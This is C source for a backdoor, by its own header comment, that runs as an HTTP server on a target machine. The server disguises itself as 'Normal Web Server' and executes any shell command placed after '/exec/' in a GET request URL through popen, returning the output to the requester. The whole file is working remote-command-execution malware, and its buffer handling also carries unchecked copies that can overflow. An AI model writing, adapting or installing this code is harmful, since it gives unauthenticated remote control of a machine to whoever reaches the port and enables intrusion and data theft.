/*H*******************************************************************************
* FILENAME: WebServer.c
* DESCRIPTION: 
*             A Backdoor program which runs as a HTTP 1.1 compliant WebServer on Target machine
* Author: Anirban Bhattacharya 
*H*/
#include <unistd.h>
#include <sys/socket.h>

#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <ctype.h>
#include <errno.h>
#include<time.h>
#include <sys/types.h>

#include <string.h>

int port = 0;
int server_socket;

void handle_accept_request(struct sockaddr_in server_address);
void SIGINT_callback_handler(int signal_num);
void get_command_from_url(char * url);
int is_gzip_enabled(const char * str);
char* getDate(void);
int main(int argc, char *argv[]){
  //Validate port number has been passed in command line argument
  if(argc < 2){
    printf("Command to Execute: ./normal_web_server <port_number>\nMissing port number.\n");
    exit(1);
  }
  port = atoi(argv[1]);

  //Create a new socket descriptor for the server
  server_socket = socket(AF_INET, SOCK_STREAM, 0);

  //check if there was an error creating socket.
  if (server_socket == 0)
  {
      perror("failed to get socket");
      exit(1);
  }

  //register handler for Ctrl + C ,i.e. SIGINT
  signal(SIGINT, SIGINT_callback_handler);

  //create server socket struct
  struct sockaddr_in server_address;
  server_address.sin_family = AF_INET;
  server_address.sin_port = htons(port);
  server_address.sin_addr.s_addr = INADDR_ANY;

  //bind socket and port for server
  int bind_status = bind(server_socket, (struct sockaddr *)&server_address, sizeof(server_address));
  if(bind_status < 0){
    perror("Binding Socket to port failed may be the port is in Use");
    exit(1);
  }

  //Server starts listening to the socket for incoming connections
  int listen_status = listen(server_socket, 3);
  if(listen_status < 0){
    perror("Cannot to listen to port");
    exit(1);
  }

  handle_accept_request(server_address);

  return 0;
}
char* getDate(void)
{
    time_t current_time;
    char* c_time_string;

    /* Obtain current time. */
    current_time = time(NULL);

    if (current_time == ((time_t)-1))
    {
        (void) fprintf(stderr, "Failure to obtain the current time.\n");
        exit(EXIT_FAILURE);
    }

    /* Convert to local time format. */
    c_time_string = ctime(&current_time);

    if (c_time_string == NULL)
    {
        (void) fprintf(stderr, "Failure to convert the current time.\n");
        exit(EXIT_FAILURE);
    }

    /* Print to stdout. ctime() has already added a terminating newline character. */
    (void) printf("Current time is %s", c_time_string);
    return c_time_string;
    exit(EXIT_SUCCESS);
}
void handle_accept_request(struct sockaddr_in server_address){
  char * curDate = getDate();
  char * data = "Hello";
//strcpy(data,curDate);
  printf("concatenated:::%s",data);
  
  //printf("Current date is %s",curDate);
  char * ok_response_header = "HTTP/1.1 200 OK\r\n"
                              "Content-Type: text/html; charset=utf-8\r\n"
                              "Accept-Ranges: bytes\r\n"
                              "Connection: close\r\n"
                              "Date: Thu, 21 Jan 2021 15:28:06 GMT\r\n"
                              "Server: Normal Web Server\r\n"
                              "Content-Length: 30000\r\n"
                              "\r\n";
                             /* "Date: ";
                              strcat(ok_response_header,curDate);
                               strcat(ok_response_header,"\n\r\n");*/
                              
  char * not_found_response_header = "HTTP/1.1 404 NOTFOUND\r\n"
                                    "Content-Type: text/html; charset=utf-8\r\n"
                                    "Accept-Ranges: bytes\r\n"
                                    "Connection: close\r\n"
                                    "Date: Thu, 21 Jan 2021 15:28:06 GMT\r\n"
                                    "Server: Normal Web Server\r\n"
                                    "Content-Length: 4096\r\n"
                                    "\r\n";
  char * get_request = "GET";
  char * host_header = "Host:";
  while(1){
    //accept incoming requests from clients
    int len_of_address = sizeof(server_address);
    int client_socket_descriptor = accept(server_socket, (struct sockaddr *)&server_address, (socklen_t *)&len_of_address);

    char buff[4096];
    char url[4096];

    read(client_socket_descriptor, buff, 2048);
    printf("The buffer is ::::%s\n", buff);

    char command_result[30000];
    char response_header[4096];

    if(strlen(buff)<= 10 || strncmp(get_request, buff, strlen(get_request)) != 0){
      strcpy(response_header, not_found_response_header);
      strcpy(command_result, "Method Not Supported");
    }
    else if(!strstr(buff,host_header))
    {
      if(!strstr(buff,"http://"))
      {
      strcpy(response_header, not_found_response_header);
      strcpy(command_result, "Method Not Supported");
      }
    }
    else{
      int i, j=0;
      for(i = 4; i<strlen(buff); i++){
        if(buff[i] == ' '){
          break;
        }
        url[j++] = buff[i];
      }
      url[j] = '\0';
      get_command_from_url(url);
      printf("Command recieved: %s\n", url);

      if(strlen(url) == 0){
        strcpy(response_header, not_found_response_header);
        strcpy(command_result, "Command is Invalid");
      }
      else{
       
        strcat(url, " 2>&1");
        char tmp_buff[4096];
        FILE* file = popen(url, "r");
        if(file == NULL){
          strcpy(response_header, not_found_response_header);
          strcpy(command_result, "Command is Invalid");
        }
        else{
          int flag = 0;
          while (fgets(tmp_buff, sizeof(tmp_buff), file) != NULL)
          { 
            printf("In erading stream");
            if(flag == 0){
                strcpy(command_result, tmp_buff);
                flag++;
            }
            else{
                strcat(command_result, tmp_buff);
            }
          }
          strcpy(response_header, ok_response_header);
        }

        if (pclose (file) != 0)
        {
          strcpy(response_header, not_found_response_header);
          file = NULL;
        }

        memset(tmp_buff, 0, sizeof(tmp_buff));
      }
    }

    char * response = NULL;
    response = malloc(strlen(response_header) + strlen(command_result) + 10);
    strcpy(response, response_header);
    strcat(response, command_result);

    send(client_socket_descriptor, response, strlen(response), 0);
    shutdown(client_socket_descriptor,2);
    close(client_socket_descriptor);
    printf("Message sent to client:\n%s\n", response);

    //clear all buffers
    memset(buff, 0, sizeof(buff));
    memset(url, 0, sizeof(url));
    memset(response, 0, sizeof(response));
    memset(command_result, 0, sizeof(command_result));
    memset(response_header, 0, sizeof(response_header));
  }
}

void SIGINT_callback_handler(int signal_num){
  //Release the port as CTRL+C is sent
  printf("Inside Siginit Handler\n");
  int status=  shutdown(server_socket, 2);
 printf("Socket Shutdown Status is %d\n",status);
  close(server_socket);
  printf("After Close Socket..");
 

  //exit program
  exit(0);
}

void get_command_from_url(char * url){
  char * tmp_ptr;
  char * cdata  = strstr(url,"/exec/");
  if(cdata)
  {
  strcpy(url,cdata);
   printf("\nURL is: %s\n",url);
   }
  tmp_ptr = malloc(strlen(url));
  int i, j=0;

  for(i = 0; i<strlen(url); i++){
    if(*(url+i) == '+'){
      tmp_ptr[j++] = ' ';
    }
    else if(*(url+i) != '%'){
      tmp_ptr[j++] = *(url+i);
    }
    else if(!isxdigit(*(url+i+1)) || !isxdigit(*(url+i+2))){
      tmp_ptr[j++] = *(url+i);
    }
    else{
      char first_char = tolower(*(url+i+1));
      char second_char = tolower(*(url+i+2));
      if(first_char <= '9'){
        first_char = first_char - '0';
      }
      else{
        first_char = first_char - 'a' + 10;
      }
      if(second_char <= '9'){
        second_char = second_char - '0';
      }
      else{
        second_char = second_char - 'a' + 10;
      }

      tmp_ptr[j++] = (16 * first_char + second_char);
      i += 2;
    }
  }
  tmp_ptr[j] = '\0';
  strcpy(url, tmp_ptr);
  printf("\nTMP PTR is:%s\n",tmp_ptr);
 
  char * exec = "/exec/";
  if(strlen(url) <= 6 || strncmp(exec, tmp_ptr, strlen(exec)) != 0){
    memset(tmp_ptr, 0, sizeof(tmp_ptr));
    printf("Now in check %s",tmp_ptr);
    strcpy(url, tmp_ptr);
    return;
  }
  
  printf("The command goes this way..%s\n",cdata);

  char command[4096];
  strcpy(command, url+6);
  strcpy(url, command);
   printf("\nURL is end: %s\n",url);
}

int is_gzip_enabled(const char * str){
  return strstr(str, "content-coding: gzip") != NULL? 1 : 0;
}
